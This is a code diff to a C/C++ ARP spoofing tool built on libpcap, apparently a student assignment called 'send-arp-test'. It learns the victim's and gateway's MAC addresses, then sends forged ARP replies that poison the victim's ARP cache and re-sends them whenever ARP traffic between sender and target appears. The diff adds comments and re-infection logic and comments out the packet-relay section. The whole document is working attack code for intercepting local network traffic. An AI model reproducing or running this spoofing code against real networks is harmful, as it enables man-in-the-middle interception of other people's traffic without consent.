@@ -32,7 +32,7 @@ void usage() {
     printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-//my IP/MAC address
+//get my IP/MAC address
 int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
     struct ifreq ifr;
     int sockfd, ret;
@@ -70,6 +70,7 @@ int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
     return 0;
 }
 
+//send arp packet
 void SendArp(pcap_t* handle, EthArpPacket* packet){
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
     if (res != 0) {
@@ -77,20 +78,21 @@ void SendArp(pcap_t* handle, EthArpPacket* packet){
     }
 }
 
+//get MAC using IP
 void SendArpReq(pcap_t* handle, Mac MAC_ADD, Ip IP_ADD, Ip ip){
     EthArpPacket packet;
-    //To get vicitm MAC address - arp request to victim
+    //To get MAC address - arp request to victim
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
-    packet.eth_.smac_ = Mac(MAC_ADD);
+    packet.eth_.smac_ = Mac(MAC_ADD); //my mac eth_packet
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD
-    packet.arp_.sip_ = htonl(IP_ADD); //my ip - any ip in here can get reply packet
-    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+    packet.arp_.smac_ = Mac(MAC_ADD); //my MAC_ADD arp_packet
+    packet.arp_.sip_ = htonl(IP_ADD); //my ip - ??!any ip in here can get reply packet
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //I want to know victim MAC
     packet.arp_.tip_ = htonl(ip);  //ip want to get MAC
 
     printf("Sending ArpRequest to get Source MAC..\n");
@@ -98,10 +100,16 @@ void SendArpReq(pcap_t* handle, Mac MAC_ADD, Ip IP_ADD, Ip ip){
     SendArp(handle, &packet);
 }
 
+//Get arp reply for get MAC
 EthArpPacket GetArpReply(pcap_t* pcap, Mac MAC_ADD,Mac* MAC_GATEWAY, Ip s_ip, Ip t_ip){
     EthArpPacket packet;
+    int check[2] = {0,};
 
     while (true) {
+            if (check[0] && check[1]){
+                break;
+            }
+
             struct pcap_pkthdr* header;
             libnet_ethernet_hdr *eth_hdr;
 
@@ -119,25 +127,28 @@ EthArpPacket GetArpReply(pcap_t* pcap, Mac MAC_ADD,Mac* MAC_GATEWAY, Ip s_ip, Ip
             if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP){
                 continue;
             }
+
             EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
 
-            //get arp request from victim
+            //get arp request from sender
             if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == s_ip){
                 printf("Source Mac Address Captured success\n");
                 packet.arp_.tmac_ = arp_packet->arp_.smac();
                 packet.eth_.dmac_ = arp_packet->arp_.smac();
+                check[0] = 1;
                 continue;
             }
 
-            //get arp request from victim
+            //get arp request from target
             if (arp_packet->arp_.op() == arp_packet->arp_.Reply && arp_packet->arp_.sip() == t_ip){
                 printf("Target Mac Address Captured success\n");
                 *MAC_GATEWAY = arp_packet->arp_.smac();
-                break;
+                check[1] = 1;
+                continue;
             }
     }
 
-    //make attack packet
+    //Successed get S/T MAC!! let's make attack packet
     //destination mac is defined (victim mac)
     packet.eth_.smac_ = Mac(MAC_ADD); //fake my mac to gateway mac
     packet.eth_.type_ = htons(EthHdr::Arp);
@@ -155,7 +166,7 @@ EthArpPacket GetArpReply(pcap_t* pcap, Mac MAC_ADD,Mac* MAC_GATEWAY, Ip s_ip, Ip
     return packet;
 }
 
-void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Mac* MAC_GATEWAY){
+void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Ip my_ip, Mac* MAC_ADD, Mac* MAC_GATEWAY, Ip s_ip, Ip t_ip){
 
     printf("Arp spoofing start...\n");
     //init attack
@@ -191,12 +202,25 @@ void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Mac*
 
             //if get ARP packet from ???? than we attack again
             if (ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP){
-                //attack packet to victim again
-                SendArp(handle, attack_packet);
+                EthArpPacket *arp_packet = (EthArpPacket *)out_packet;
+                if(arp_packet->arp_.sip() == s_ip && arp_packet->arp_.tip() == t_ip){
+                    //attack packet again
+                    printf("s->t arp detected relay to sender... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
+                    SendArp(handle, attack_packet);
+                    continue;
+                }
+                if(arp_packet->arp_.sip() == t_ip && arp_packet->arp_.tip() == my_ip){
+                    //attack packet again
+                    printf("t->s arp detected relay to target... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
+                    SendArp(handle, attack_packet);
+                    continue;
+                }
             }
 
-           //make relay packetS
-           memcpy(eth_hdr->ether_dhost, MAC_GATEWAY, ETHER_ADDR_LEN);
+           /* why I have to make relay packet..???
+           //make relay packets
+           memcpy(eth_hdr->ether_dhost, MAC_GATEWAY, ETHER_ADDR_LEN); //
+           memcpy(eth_hdr->ether_shost, MAC_ADD, ETHER_ADDR_LEN);
 
            printf("relay to gateway... ether type : 0x%04X\n", ntohs(eth_hdr->ether_type));
            //relay to gateway
@@ -205,6 +229,7 @@ void ArpSpoofing(pcap_t* pcap, pcap_t* handle, EthArpPacket* attack_packet, Mac*
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
+           */
     }
 }
 
@@ -239,17 +264,18 @@ int main(int argc, char* argv[]) {
     //MAC_ADD , IP_ADD is my mac & ip
     GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
 
-    //Send ARP request to get victim MAC ADD
+    //Send ARP request to get sender MAC ADD
     SendArpReq(handle,MAC_ADD, IP_ADD, s_ip);
 
-    //Send ARP request to get gateway MAC ADD
+    //Send ARP request to get target MAC ADD
     SendArpReq(handle,MAC_ADD, IP_ADD, t_ip);
 
-    //waiting for ARP reply packet from victim... to get vicitm MAC & make attack_packet
+    //waiting for ARP reply packet... to get sender/target MAC & make attack_packet
     attack_packet = GetArpReply(pcap, MAC_ADD, &MAC_GATEWAY, s_ip, t_ip);
 
     //attack packet
-    ArpSpoofing(pcap, handle, &attack_packet, &MAC_GATEWAY);
+    ArpSpoofing(pcap, handle, &attack_packet, IP_ADD, &MAC_ADD, &MAC_GATEWAY, s_ip, t_ip);
 
+    pcap_close(pcap);
     pcap_close(handle);
 }
